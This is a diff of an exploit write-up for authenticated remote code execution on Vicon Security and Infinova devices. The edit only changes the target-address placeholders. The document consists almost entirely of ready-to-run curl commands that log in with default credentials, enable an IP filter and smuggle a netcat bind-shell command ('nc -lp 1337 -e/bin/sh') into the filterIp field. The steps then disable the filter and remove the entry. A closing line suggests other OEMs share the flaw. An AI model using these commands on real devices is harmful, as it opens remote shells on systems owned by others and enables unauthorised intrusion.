@@ -7,19 +7,19 @@ Vicon Security RCE (authenticated)
 
 // Enable 'IP Filter'
 
-curl --user ADMIN:1234 -v -X POST http://<IP>:<PORT>/form/formChangeFirewallState -d "state=2"
+curl --user ADMIN:1234 -v -X POST http://[IP:PORT]/form/formChangeFirewallState -d "state=2"
   
 // Add to 'IP Filter' and execute
 
-curl --user ADMIN:1234 -v -X POST http://<IP>:<PORT>/form/AddIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"
+curl --user ADMIN:1234 -v -X POST http://[IP:PORT]/form/AddIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"
   
 // Disable 'IP Filter'
 
-curl --user ADMIN:1234 -v -X POST http://<IP>:<PORT>/form/formChangeFirewallState -d "state=0"
+curl --user ADMIN:1234 -v -X POST http://[IP:PORT]/form/formChangeFirewallState -d "state=0"
   
 // Remove from 'IP Filter'
 
-curl --user ADMIN:1234 -v -X POST http://<IP>:<PORT>/form/DeleteIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"
+curl --user ADMIN:1234 -v -X POST http://[IP:PORT]/form/DeleteIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"
 
 Infinova RCE (authenticated)
 ---
@@ -27,19 +27,19 @@ Infinova RCE (authenticated)
 
 // Enable 'IP Filter'
 
-curl --user admin:admin -v -X POST http://<IP>:<PORT>/form/formChangeFirewallState -d "state=2"
+curl --user admin:admin -v -X POST http://[IP:PORT]/form/formChangeFirewallState -d "state=2"
 
 // Add to 'IP Filter' and execute
 
-curl --user admin:admin -v -X POST http://<IP>:<PORT>/form/AddIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"
+curl --user admin:admin -v -X POST http://[IP:PORT]/form/AddIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"
 
 // Disable 'IP Filter'
 
-curl --user admin:admin -v -X POST http://<IP>:<PORT>/form/formChangeFirewallState -d "state=0"
+curl --user admin:admin -v -X POST http://[IP:PORT]/form/formChangeFirewallState -d "state=0"
 
 // Remove from 'IP Filter'
 
-curl --user admin:admin -v -X POST http://<IP>:<PORT>/form/DeleteIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"
+curl --user admin:admin -v -X POST http://[IP:PORT]/form/DeleteIPFilter -d "list=2&type=1&filterIp=\$(nc -lp 1337 -e/bin/sh)"
 
 Note: Quite sure there is additional OEM's that share same.
 
